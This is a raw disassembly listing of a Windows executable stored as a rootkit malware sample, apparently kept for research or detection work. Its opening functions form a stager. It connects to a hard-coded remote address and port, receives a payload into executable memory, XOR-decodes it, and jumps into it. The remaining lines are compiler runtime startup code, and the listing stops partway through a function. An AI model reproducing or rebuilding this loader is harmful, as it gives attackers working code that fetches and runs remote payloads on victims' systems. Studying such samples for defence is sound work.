
malware_samples/rootkit/0925b8985b19d7925d68186d666b0050a4cb3f2a577d64765d770a57a2eab9ae.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	41 57                	push   %r15
   140001002:	41 56                	push   %r14
   140001004:	41 55                	push   %r13
   140001006:	41 54                	push   %r12
   140001008:	56                   	push   %rsi
   140001009:	57                   	push   %rdi
   14000100a:	55                   	push   %rbp
   14000100b:	53                   	push   %rbx
   14000100c:	48 81 ec e8 01 00 00 	sub    $0x1e8,%rsp
   140001013:	45 89 ce             	mov    %r9d,%r14d
   140001016:	4d 89 c4             	mov    %r8,%r12
   140001019:	89 d6                	mov    %edx,%esi
   14000101b:	89 cd                	mov    %ecx,%ebp
   14000101d:	48 8b 05 14 60 01 00 	mov    0x16014(%rip),%rax        # 0x140017038
   140001024:	48 31 e0             	xor    %rsp,%rax
   140001027:	48 89 84 24 e0 01 00 	mov    %rax,0x1e0(%rsp)
   14000102e:	00 
   14000102f:	c7 44 24 34 68 bf 00 	movl   $0xbf68,0x34(%rsp)
   140001036:	00 
   140001037:	48 8d 7c 24 48       	lea    0x48(%rsp),%rdi
   14000103c:	41 b8 98 01 00 00    	mov    $0x198,%r8d
   140001042:	48 89 f9             	mov    %rdi,%rcx
   140001045:	31 d2                	xor    %edx,%edx
   140001047:	e8 e4 12 00 00       	call   0x140002330
   14000104c:	66 b9 02 02          	mov    $0x202,%cx
   140001050:	48 89 fa             	mov    %rdi,%rdx
   140001053:	e8 88 c2 00 00       	call   0x14000d2e0
   140001058:	48 c7 44 24 38 02 00 	movq   $0x2,0x38(%rsp)
   14000105f:	00 00 
   140001061:	89 6c 24 3c          	mov    %ebp,0x3c(%rsp)
   140001065:	89 f1                	mov    %esi,%ecx
   140001067:	e8 a4 c2 00 00       	call   0x14000d310
   14000106c:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   140001071:	41 bd ff ff ff ff    	mov    $0xffffffff,%r13d
   140001077:	85 ed                	test   %ebp,%ebp
   140001079:	0f 84 f2 00 00 00    	je     0x140001171
   14000107f:	85 f6                	test   %esi,%esi
   140001081:	0f 84 ea 00 00 00    	je     0x140001171
   140001087:	48 8b b4 24 50 02 00 	mov    0x250(%rsp),%rsi
   14000108e:	00 
   14000108f:	48 85 f6             	test   %rsi,%rsi
   140001092:	0f 84 d9 00 00 00    	je     0x140001171
   140001098:	8b bc 24 58 02 00 00 	mov    0x258(%rsp),%edi
   14000109f:	85 ff                	test   %edi,%edi
   1400010a1:	0f 84 ca 00 00 00    	je     0x140001171
   1400010a7:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400010ac:	ba 01 00 00 00       	mov    $0x1,%edx
   1400010b1:	45 31 c0             	xor    %r8d,%r8d
   1400010b4:	e8 97 c2 00 00       	call   0x14000d350
   1400010b9:	49 89 c7             	mov    %rax,%r15
   1400010bc:	49 63 ef             	movslq %r15d,%rbp
   1400010bf:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   1400010c6:	00 
   1400010c7:	48 8d 5c 24 34       	lea    0x34(%rsp),%rbx
   1400010cc:	48 89 e9             	mov    %rbp,%rcx
   1400010cf:	ba ff ff 00 00       	mov    $0xffff,%edx
   1400010d4:	41 b8 05 10 00 00    	mov    $0x1005,%r8d
   1400010da:	49 89 d9             	mov    %rbx,%r9
   1400010dd:	e8 5e c2 00 00       	call   0x14000d340
   1400010e2:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   1400010e9:	00 
   1400010ea:	48 89 e9             	mov    %rbp,%rcx
   1400010ed:	ba ff ff 00 00       	mov    $0xffff,%edx
   1400010f2:	41 b8 06 10 00 00    	mov    $0x1006,%r8d
   1400010f8:	49 89 d9             	mov    %rbx,%r9
   1400010fb:	e8 40 c2 00 00       	call   0x14000d340
   140001100:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   140001105:	48 89 e9             	mov    %rbp,%rcx
   140001108:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   14000110e:	e8 ed c1 00 00       	call   0x14000d300
   140001113:	83 f8 ff             	cmp    $0xffffffff,%eax
   140001116:	74 59                	je     0x140001171
   140001118:	31 db                	xor    %ebx,%ebx
   14000111a:	48 89 e9             	mov    %rbp,%rcx
   14000111d:	4c 89 e2             	mov    %r12,%rdx
   140001120:	45 89 f0             	mov    %r14d,%r8d
   140001123:	45 31 c9             	xor    %r9d,%r9d
   140001126:	e8 05 c2 00 00       	call   0x14000d330
   14000112b:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000112e:	74 41                	je     0x140001171
   140001130:	41 89 d8             	mov    %ebx,%r8d
   140001133:	41 f7 d0             	not    %r8d
   140001136:	41 01 f8             	add    %edi,%r8d
   140001139:	48 89 e9             	mov    %rbp,%rcx
   14000113c:	48 89 f2             	mov    %rsi,%rdx
   14000113f:	45 31 c9             	xor    %r9d,%r9d
   140001142:	e8 d9 c1 00 00       	call   0x14000d320
   140001147:	8d 48 01             	lea    0x1(%rax),%ecx
   14000114a:	83 f9 02             	cmp    $0x2,%ecx
   14000114d:	72 12                	jb     0x140001161
   14000114f:	01 c3                	add    %eax,%ebx
   140001151:	48 98                	cltq
   140001153:	48 01 c6             	add    %rax,%rsi
   140001156:	89 d8                	mov    %ebx,%eax
   140001158:	f7 d0                	not    %eax
   14000115a:	01 f8                	add    %edi,%eax
   14000115c:	83 f8 04             	cmp    $0x4,%eax
   14000115f:	7f cf                	jg     0x140001130
   140001161:	45 85 ff             	test   %r15d,%r15d
   140001164:	74 08                	je     0x14000116e
   140001166:	48 89 e9             	mov    %rbp,%rcx
   140001169:	e8 82 c1 00 00       	call   0x14000d2f0
   14000116e:	41 89 dd             	mov    %ebx,%r13d
   140001171:	48 8b 8c 24 e0 01 00 	mov    0x1e0(%rsp),%rcx
   140001178:	00 
   140001179:	48 31 e1             	xor    %rsp,%rcx
   14000117c:	e8 9f 01 00 00       	call   0x140001320
   140001181:	44 89 e8             	mov    %r13d,%eax
   140001184:	48 81 c4 e8 01 00 00 	add    $0x1e8,%rsp
   14000118b:	5b                   	pop    %rbx
   14000118c:	5d                   	pop    %rbp
   14000118d:	5f                   	pop    %rdi
   14000118e:	5e                   	pop    %rsi
   14000118f:	41 5c                	pop    %r12
   140001191:	41 5d                	pop    %r13
   140001193:	41 5e                	pop    %r14
   140001195:	41 5f                	pop    %r15
   140001197:	c3                   	ret
   140001198:	cc                   	int3
   140001199:	cc                   	int3
   14000119a:	cc                   	int3
   14000119b:	cc                   	int3
   14000119c:	cc                   	int3
   14000119d:	cc                   	int3
   14000119e:	cc                   	int3
   14000119f:	cc                   	int3
   1400011a0:	41 56                	push   %r14
   1400011a2:	56                   	push   %rsi
   1400011a3:	57                   	push   %rdi
   1400011a4:	53                   	push   %rbx
   1400011a5:	48 83 ec 38          	sub    $0x38,%rsp
   1400011a9:	ba 00 00 50 00       	mov    $0x500000,%edx
   1400011ae:	31 c9                	xor    %ecx,%ecx
   1400011b0:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   1400011b6:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   1400011bc:	ff 15 8e 47 01 00    	call   *0x1478e(%rip)        # 0x140015950
   1400011c2:	49 89 c6             	mov    %rax,%r14
   1400011c5:	41 b8 00 00 50 00    	mov    $0x500000,%r8d
   1400011cb:	48 89 c1             	mov    %rax,%rcx
   1400011ce:	31 d2                	xor    %edx,%edx
   1400011d0:	e8 5b 11 00 00       	call   0x140002330
   1400011d5:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400011da:	c7 44 24 28 00 00 50 	movl   $0x500000,0x28(%rsp)
   1400011e1:	00 
   1400011e2:	4c 8d 05 17 5e 01 00 	lea    0x15e17(%rip),%r8        # 0x140017000
   1400011e9:	b9 6e 2a 04 18       	mov    $0x18042a6e,%ecx
   1400011ee:	ba 14 1e 00 00       	mov    $0x1e14,%edx
   1400011f3:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   1400011f9:	e8 02 fe ff ff       	call   0x140001000
   1400011fe:	85 c0                	test   %eax,%eax
   140001200:	0f 8e e6 00 00 00    	jle    0x1400012ec
   140001206:	41 89 c0             	mov    %eax,%r8d
   140001209:	45 31 db             	xor    %r11d,%r11d
   14000120c:	83 f8 01             	cmp    $0x1,%eax
   14000120f:	0f 84 9d 00 00 00    	je     0x1400012b2
   140001215:	4c 89 f0             	mov    %r14,%rax
   140001218:	48 83 c0 01          	add    $0x1,%rax
   14000121c:	45 89 c2             	mov    %r8d,%r10d
   14000121f:	41 83 e2 fe          	and    $0xfffffffe,%r10d
   140001223:	49 f7 da             	neg    %r10
   140001226:	be 01 00 00 00       	mov    $0x1,%esi
   14000122b:	4c 8d 0d de 5d 01 00 	lea    0x15dde(%rip),%r9        # 0x140017010
   140001232:	31 c9                	xor    %ecx,%ecx
   140001234:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000123b:	00 00 00 
   14000123e:	66 90                	xchg   %ax,%ax
   140001240:	89 f3                	mov    %esi,%ebx
   140001242:	48 69 d3 25 49 92 24 	imul   $0x24924925,%rbx,%rdx
   140001249:	48 c1 ea 20          	shr    $0x20,%rdx
   14000124d:	89 f3                	mov    %esi,%ebx
   14000124f:	29 d3                	sub    %edx,%ebx
   140001251:	d1 eb                	shr    $1,%ebx
   140001253:	01 d3                	add    %edx,%ebx
   140001255:	c1 eb 02             	shr    $0x2,%ebx
   140001258:	8d 14 dd 00 00 00 00 	lea    0x0(,%rbx,8),%edx
   14000125f:	29 d3                	sub    %edx,%ebx
   140001261:	01 f3                	add    %esi,%ebx
   140001263:	44 89 da             	mov    %r11d,%edx
   140001266:	48 69 d2 25 49 92 24 	imul   $0x24924925,%rdx,%rdx
   14000126d:	48 c1 ea 20          	shr    $0x20,%rdx
   140001271:	44 89 df             	mov    %r11d,%edi
   140001274:	29 d7                	sub    %edx,%edi
   140001276:	d1 ef                	shr    $1,%edi
   140001278:	01 d7                	add    %edx,%edi
   14000127a:	c1 ef 02             	shr    $0x2,%edi
   14000127d:	8d 14 fd 00 00 00 00 	lea    0x0(,%rdi,8),%edx
   140001284:	29 d7                	sub    %edx,%edi
   140001286:	44 01 df             	add    %r11d,%edi
   140001289:	41 0f b6 14 b9       	movzbl (%r9,%rdi,4),%edx
   14000128e:	30 50 ff             	xor    %dl,-0x1(%rax)
   140001291:	41 0f b6 14 99       	movzbl (%r9,%rbx,4),%edx
   140001296:	30 10                	xor    %dl,(%rax)
   140001298:	48 83 c0 02          	add    $0x2,%rax
   14000129c:	83 c6 02             	add    $0x2,%esi
   14000129f:	48 83 c1 fe          	add    $0xfffffffffffffffe,%rcx
   1400012a3:	41 83 c3 02          	add    $0x2,%r11d
   1400012a7:	49 39 ca             	cmp    %rcx,%r10
   1400012aa:	75 94                	jne    0x140001240
   1400012ac:	48 f7 d9             	neg    %rcx
   1400012af:	49 89 cb             	mov    %rcx,%r11
   1400012b2:	41 f6 c0 01          	test   $0x1,%r8b
   1400012b6:	74 34                	je     0x1400012ec
   1400012b8:	44 89 d8             	mov    %r11d,%eax
   1400012bb:	48 69 c0 25 49 92 24 	imul   $0x24924925,%rax,%rax
   1400012c2:	48 c1 e8 20          	shr    $0x20,%rax
   1400012c6:	44 89 d9             	mov    %r11d,%ecx
   1400012c9:	29 c1                	sub    %eax,%ecx
   1400012cb:	d1 e9                	shr    $1,%ecx
   1400012cd:	01 c1                	add    %eax,%ecx
   1400012cf:	c1 e9 02             	shr    $0x2,%ecx
   1400012d2:	8d 04 cd 00 00 00 00 	lea    0x0(,%rcx,8),%eax
   1400012d9:	29 c1                	sub    %eax,%ecx
   1400012db:	44 01 d9             	add    %r11d,%ecx
   1400012de:	48 8d 05 2b 5d 01 00 	lea    0x15d2b(%rip),%rax        # 0x140017010
   1400012e5:	8a 04 88             	mov    (%rax,%rcx,4),%al
   1400012e8:	43 30 04 1e          	xor    %al,(%r14,%r11,1)
   1400012ec:	41 ff d6             	call   *%r14
   1400012ef:	ff 15 eb 44 01 00    	call   *0x144eb(%rip)        # 0x1400157e0
   1400012f5:	48 89 c1             	mov    %rax,%rcx
   1400012f8:	31 d2                	xor    %edx,%edx
   1400012fa:	ff 15 20 46 01 00    	call   *0x14620(%rip)        # 0x140015920
   140001300:	31 c0                	xor    %eax,%eax
   140001302:	48 83 c4 38          	add    $0x38,%rsp
   140001306:	5b                   	pop    %rbx
   140001307:	5f                   	pop    %rdi
   140001308:	5e                   	pop    %rsi
   140001309:	41 5e                	pop    %r14
   14000130b:	c3                   	ret
   14000130c:	cc                   	int3
   14000130d:	cc                   	int3
   14000130e:	cc                   	int3
   14000130f:	cc                   	int3
   140001310:	cc                   	int3
   140001311:	cc                   	int3
   140001312:	cc                   	int3
   140001313:	cc                   	int3
   140001314:	cc                   	int3
   140001315:	cc                   	int3
   140001316:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000131d:	00 00 00 
   140001320:	48 3b 0d 11 5d 01 00 	cmp    0x15d11(%rip),%rcx        # 0x140017038
   140001327:	75 10                	jne    0x140001339
   140001329:	48 c1 c1 10          	rol    $0x10,%rcx
   14000132d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140001332:	75 01                	jne    0x140001335
   140001334:	c3                   	ret
   140001335:	48 c1 c9 10          	ror    $0x10,%rcx
   140001339:	e9 b2 00 00 00       	jmp    0x1400013f0
   14000133e:	cc                   	int3
   14000133f:	cc                   	int3
   140001340:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140001344:	48 83 ec 28          	sub    $0x28,%rsp
   140001348:	b9 17 00 00 00       	mov    $0x17,%ecx
   14000134d:	ff 15 45 45 01 00    	call   *0x14545(%rip)        # 0x140015898
   140001353:	85 c0                	test   %eax,%eax
   140001355:	74 08                	je     0x14000135f
   140001357:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000135b:	8b c8                	mov    %eax,%ecx
   14000135d:	cd 29                	int    $0x29
   14000135f:	48 8d 0d 4a 67 01 00 	lea    0x1674a(%rip),%rcx        # 0x140017ab0
   140001366:	e8 59 01 00 00       	call   0x1400014c4
   14000136b:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140001370:	48 89 05 31 68 01 00 	mov    %rax,0x16831(%rip)        # 0x140017ba8
   140001377:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
   14000137c:	48 83 c0 08          	add    $0x8,%rax
   140001380:	48 89 05 c1 67 01 00 	mov    %rax,0x167c1(%rip)        # 0x140017b48
   140001387:	48 8b 05 1a 68 01 00 	mov    0x1681a(%rip),%rax        # 0x140017ba8
   14000138e:	48 89 05 8b 66 01 00 	mov    %rax,0x1668b(%rip)        # 0x140017a20
   140001395:	c7 05 71 66 01 00 09 	movl   $0xc0000409,0x16671(%rip)        # 0x140017a10
   14000139c:	04 00 c0 
   14000139f:	c7 05 6b 66 01 00 01 	movl   $0x1,0x1666b(%rip)        # 0x140017a14
   1400013a6:	00 00 00 
   1400013a9:	c7 05 75 66 01 00 01 	movl   $0x1,0x16675(%rip)        # 0x140017a28
   1400013b0:	00 00 00 
   1400013b3:	b8 08 00 00 00       	mov    $0x8,%eax
   1400013b8:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400013bc:	48 8d 0d 6d 66 01 00 	lea    0x1666d(%rip),%rcx        # 0x140017a30
   1400013c3:	8b 54 24 30          	mov    0x30(%rsp),%edx
   1400013c7:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
   1400013cb:	48 8d 0d 2e cc 00 00 	lea    0xcc2e(%rip),%rcx        # 0x14000e000
   1400013d2:	e8 d1 01 00 00       	call   0x1400015a8
   1400013d7:	48 83 c4 28          	add    $0x28,%rsp
   1400013db:	c3                   	ret
   1400013dc:	48 83 ec 28          	sub    $0x28,%rsp
   1400013e0:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400013e5:	e8 56 ff ff ff       	call   0x140001340
   1400013ea:	48 83 c4 28          	add    $0x28,%rsp
   1400013ee:	c3                   	ret
   1400013ef:	cc                   	int3
   1400013f0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1400013f5:	48 83 ec 38          	sub    $0x38,%rsp
   1400013f9:	b9 17 00 00 00       	mov    $0x17,%ecx
   1400013fe:	ff 15 94 44 01 00    	call   *0x14494(%rip)        # 0x140015898
   140001404:	85 c0                	test   %eax,%eax
   140001406:	74 07                	je     0x14000140f
   140001408:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000140d:	cd 29                	int    $0x29
   14000140f:	48 8d 0d 9a 66 01 00 	lea    0x1669a(%rip),%rcx        # 0x140017ab0
   140001416:	e8 19 01 00 00       	call   0x140001534
   14000141b:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140001420:	48 89 05 81 67 01 00 	mov    %rax,0x16781(%rip)        # 0x140017ba8
   140001427:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   14000142c:	48 83 c0 08          	add    $0x8,%rax
   140001430:	48 89 05 11 67 01 00 	mov    %rax,0x16711(%rip)        # 0x140017b48
   140001437:	48 8b 05 6a 67 01 00 	mov    0x1676a(%rip),%rax        # 0x140017ba8
   14000143e:	48 89 05 db 65 01 00 	mov    %rax,0x165db(%rip)        # 0x140017a20
   140001445:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   14000144a:	48 89 05 df 66 01 00 	mov    %rax,0x166df(%rip)        # 0x140017b30
   140001451:	c7 05 b5 65 01 00 09 	movl   $0xc0000409,0x165b5(%rip)        # 0x140017a10
   140001458:	04 00 c0 
   14000145b:	c7 05 af 65 01 00 01 	movl   $0x1,0x165af(%rip)        # 0x140017a14
   140001462:	00 00 00 
   140001465:	c7 05 b9 65 01 00 01 	movl   $0x1,0x165b9(%rip)        # 0x140017a28
   14000146c:	00 00 00 
   14000146f:	b8 08 00 00 00       	mov    $0x8,%eax
   140001474:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140001478:	48 8d 0d b1 65 01 00 	lea    0x165b1(%rip),%rcx        # 0x140017a30
   14000147f:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   140001486:	00 
   140001487:	b8 08 00 00 00       	mov    $0x8,%eax
   14000148c:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140001490:	48 8b 0d a1 5b 01 00 	mov    0x15ba1(%rip),%rcx        # 0x140017038
   140001497:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   14000149c:	b8 08 00 00 00       	mov    $0x8,%eax
   1400014a1:	48 6b c0 01          	imul   $0x1,%rax,%rax
   1400014a5:	48 8b 0d 84 5b 01 00 	mov    0x15b84(%rip),%rcx        # 0x140017030
   1400014ac:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1400014b1:	48 8d 0d 48 cb 00 00 	lea    0xcb48(%rip),%rcx        # 0x14000e000
   1400014b8:	e8 eb 00 00 00       	call   0x1400015a8
   1400014bd:	48 83 c4 38          	add    $0x38,%rsp
   1400014c1:	c3                   	ret
   1400014c2:	cc                   	int3
   1400014c3:	cc                   	int3
   1400014c4:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400014c9:	57                   	push   %rdi
   1400014ca:	48 83 ec 40          	sub    $0x40,%rsp
   1400014ce:	48 8b d9             	mov    %rcx,%rbx
   1400014d1:	ff 15 01 44 01 00    	call   *0x14401(%rip)        # 0x1400158d8
   1400014d7:	48 8b bb f8 00 00 00 	mov    0xf8(%rbx),%rdi
   1400014de:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400014e3:	48 8b cf             	mov    %rdi,%rcx
   1400014e6:	45 33 c0             	xor    %r8d,%r8d
   1400014e9:	ff 15 f1 43 01 00    	call   *0x143f1(%rip)        # 0x1400158e0
   1400014ef:	48 85 c0             	test   %rax,%rax
   1400014f2:	74 32                	je     0x140001526
   1400014f4:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1400014fa:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400014ff:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   140001504:	4c 8b c8             	mov    %rax,%r9
   140001507:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000150c:	4c 8b c7             	mov    %rdi,%r8
   14000150f:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140001514:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140001519:	33 c9                	xor    %ecx,%ecx
   14000151b:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001520:	ff 15 ca 43 01 00    	call   *0x143ca(%rip)        # 0x1400158f0
   140001526:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   14000152b:	48 83 c4 40          	add    $0x40,%rsp
   14000152f:	5f                   	pop    %rdi
   140001530:	c3                   	ret
   140001531:	cc                   	int3
   140001532:	cc                   	int3
   140001533:	cc                   	int3
   140001534:	40 53                	rex push %rbx
   140001536:	56                   	push   %rsi
   140001537:	57                   	push   %rdi
   140001538:	48 83 ec 40          	sub    $0x40,%rsp
   14000153c:	48 8b d9             	mov    %rcx,%rbx
   14000153f:	ff 15 93 43 01 00    	call   *0x14393(%rip)        # 0x1400158d8
   140001545:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   14000154c:	33 ff                	xor    %edi,%edi
   14000154e:	45 33 c0             	xor    %r8d,%r8d
   140001551:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140001556:	48 8b ce             	mov    %rsi,%rcx
   140001559:	ff 15 81 43 01 00    	call   *0x14381(%rip)        # 0x1400158e0
   14000155f:	48 85 c0             	test   %rax,%rax
   140001562:	74 39                	je     0x14000159d
   140001564:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000156a:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   14000156f:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140001574:	4c 8b c8             	mov    %rax,%r9
   140001577:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000157c:	4c 8b c6             	mov    %rsi,%r8
   14000157f:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140001584:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140001589:	33 c9                	xor    %ecx,%ecx
   14000158b:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001590:	ff 15 5a 43 01 00    	call   *0x1435a(%rip)        # 0x1400158f0
   140001596:	ff c7                	inc    %edi
   140001598:	83 ff 02             	cmp    $0x2,%edi
   14000159b:	7c b1                	jl     0x14000154e
   14000159d:	48 83 c4 40          	add    $0x40,%rsp
   1400015a1:	5f                   	pop    %rdi
   1400015a2:	5e                   	pop    %rsi
   1400015a3:	5b                   	pop    %rbx
   1400015a4:	c3                   	ret
   1400015a5:	cc                   	int3
   1400015a6:	cc                   	int3
   1400015a7:	cc                   	int3
   1400015a8:	40 53                	rex push %rbx
   1400015aa:	48 83 ec 20          	sub    $0x20,%rsp
   1400015ae:	48 8b d9             	mov    %rcx,%rbx
   1400015b1:	33 c9                	xor    %ecx,%ecx
   1400015b3:	ff 15 5f 43 01 00    	call   *0x1435f(%rip)        # 0x140015918
   1400015b9:	48 8b cb             	mov    %rbx,%rcx
   1400015bc:	ff 15 86 43 01 00    	call   *0x14386(%rip)        # 0x140015948
   1400015c2:	ff 15 18 42 01 00    	call   *0x14218(%rip)        # 0x1400157e0
   1400015c8:	48 8b c8             	mov    %rax,%rcx
   1400015cb:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   1400015d0:	48 83 c4 20          	add    $0x20,%rsp
   1400015d4:	5b                   	pop    %rbx
   1400015d5:	48 ff 25 44 43 01 00 	rex.W jmp *0x14344(%rip)        # 0x140015920
   1400015dc:	40 53                	rex push %rbx
   1400015de:	48 83 ec 20          	sub    $0x20,%rsp
   1400015e2:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400015e7:	e8 70 22 00 00       	call   0x14000385c
   1400015ec:	e8 67 05 00 00       	call   0x140001b58
   1400015f1:	8b c8                	mov    %eax,%ecx
   1400015f3:	e8 6c 22 00 00       	call   0x140003864
   1400015f8:	e8 4f 05 00 00       	call   0x140001b4c
   1400015fd:	8b d8                	mov    %eax,%ebx
   1400015ff:	e8 6c 10 00 00       	call   0x140002670
   140001604:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001609:	89 18                	mov    %ebx,(%rax)
   14000160b:	e8 04 04 00 00       	call   0x140001a14
   140001610:	84 c0                	test   %al,%al
   140001612:	74 73                	je     0x140001687
   140001614:	e8 c3 07 00 00       	call   0x140001ddc
   140001619:	48 8d 0d f8 07 00 00 	lea    0x7f8(%rip),%rcx        # 0x140001e18
   140001620:	e8 2b 02 00 00       	call   0x140001850
   140001625:	e8 26 05 00 00       	call   0x140001b50
   14000162a:	8b c8                	mov    %eax,%ecx
   14000162c:	e8 c7 14 00 00       	call   0x140002af8
   140001631:	85 c0                	test   %eax,%eax
   140001633:	75 52                	jne    0x140001687
   140001635:	e8 26 05 00 00       	call   0x140001b60
   14000163a:	e8 65 05 00 00       	call   0x140001ba4
   14000163f:	85 c0                	test   %eax,%eax
   140001641:	74 0c                	je     0x14000164f
   140001643:	48 8d 0d 02 05 00 00 	lea    0x502(%rip),%rcx        # 0x140001b4c
   14000164a:	e8 29 10 00 00       	call   0x140002678
   14000164f:	e8 20 05 00 00       	call   0x140001b74
   140001654:	e8 1b 05 00 00       	call   0x140001b74
   140001659:	e8 ee 04 00 00       	call   0x140001b4c
   14000165e:	8b c8                	mov    %eax,%ecx
   140001660:	e8 87 13 00 00       	call   0x1400029ec
   140001665:	e8 06 05 00 00       	call   0x140001b70
   14000166a:	84 c0                	test   %al,%al
   14000166c:	74 05                	je     0x140001673
   14000166e:	e8 29 1c 00 00       	call   0x14000329c
   140001673:	e8 d4 04 00 00       	call   0x140001b4c
   140001678:	e8 9f 05 00 00       	call   0x140001c1c
   14000167d:	85 c0                	test   %eax,%eax
   14000167f:	75 06                	jne    0x140001687
   140001681:	48 83 c4 20          	add    $0x20,%rsp
   140001685:	5b                   	pop    %rbx
   140001686:	c3                   	ret
   140001687:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000168c:	e8 a3 05 00 00       	call   0x140001c34
   140001691:	cc                   	int3
   140001692:	cc                   	int3
   140001693:	cc                   	int3
   140001694:	48 83 ec 28          	sub    $0x28,%rsp
   140001698:	e8 db 04 00 00       	call   0x140001b78
   14000169d:	33 c0                	xor    %eax,%eax
   14000169f:	48 83 c4 28          	add    $0x28,%rsp
   1400016a3:	c3                   	ret
   1400016a4:	48 83 ec 28          	sub    $0x28,%rsp
   1400016a8:	e8 77 05 00 00       	call   0x140001c24
   1400016ad:	e8 9a 04 00 00       	call   0x140001b4c
   1400016b2:	8b c8                	mov    %eax,%ecx
   1400016b4:	48 83 c4 28          	add    $0x28,%rsp
   1400016b8:	e9 ef 21 00 00       	jmp    0x1400038ac
   1400016bd:	cc                   	int3
   1400016be:	cc                   	int3
   1400016bf:	cc                   	int3
   1400016c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400016c5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400016ca:	57                   	push   %rdi
   1400016cb:	48 83 ec 30          	sub    $0x30,%rsp
   1400016cf:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400016d4:	e8 c3 02 00 00       	call   0x14000199c
   1400016d9:	84 c0                	test   %al,%al
   1400016db:	0f 84 36 01 00 00    	je     0x140001817
   1400016e1:	40 32 f6             	xor    %sil,%sil
   1400016e4:	40 88 74 24 20       	mov    %sil,0x20(%rsp)
   1400016e9:	e8 4e 02 00 00       	call   0x14000193c
   1400016ee:	8a d8                	mov    %al,%bl
   1400016f0:	8b 0d 8a 68 01 00    	mov    0x1688a(%rip),%ecx        # 0x140017f80
   1400016f6:	83 f9 01             	cmp    $0x1,%ecx
   1400016f9:	0f 84 23 01 00 00    	je     0x140001822
   1400016ff:	85 c9                	test   %ecx,%ecx
   140001701:	75 4a                	jne    0x14000174d
   140001703:	c7 05 73 68 01 00 01 	movl   $0x1,0x16873(%rip)        # 0x140017f80
   14000170a:	00 00 00 
   14000170d:	48 8d 15 4c 3d 01 00 	lea    0x13d4c(%rip),%rdx        # 0x140015460
   140001714:	48 8d 0d 0d 3d 01 00 	lea    0x13d0d(%rip),%rcx        # 0x140015428
   14000171b:	e8 70 1f 00 00       	call   0x140003690
   140001720:	85 c0                	test   %eax,%eax
   140001722:	74 0a                	je     0x14000172e
   140001724:	b8 ff 00 00 00       	mov    $0xff,%eax
   140001729:	e9 d9 00 00 00       	jmp    0x140001807
   14000172e:	48 8d 15 eb 3c 01 00 	lea    0x13ceb(%rip),%rdx        # 0x140015420
   140001735:	48 8d 0d d4 3c 01 00 	lea    0x13cd4(%rip),%rcx        # 0x140015410
   14000173c:	e8 eb 1e 00 00       	call   0x14000362c
   140001741:	c7 05 35 68 01 00 02 	movl   $0x2,0x16835(%rip)        # 0x140017f80
   140001748:	00 00 00 
   14000174b:	eb 08                	jmp    0x140001755
   14000174d:	40 b6 01             	mov    $0x1,%sil
   140001750:	40 88 74 24 20       	mov    %sil,0x20(%rsp)
   140001755:	8a cb                	mov    %bl,%cl
   140001757:	e8 1c 02 00 00       	call   0x140001978
   14000175c:	e8 4f 04 00 00       	call   0x140001bb0
   140001761:	48 8b d8             	mov    %rax,%rbx
   140001764:	48 83 38 00          	cmpq   $0x0,(%rax)
   140001768:	74 1e                	je     0x140001788
   14000176a:	48 8b c8             	mov    %rax,%rcx
   14000176d:	e8 32 01 00 00       	call   0x1400018a4
   140001772:	84 c0                	test   %al,%al
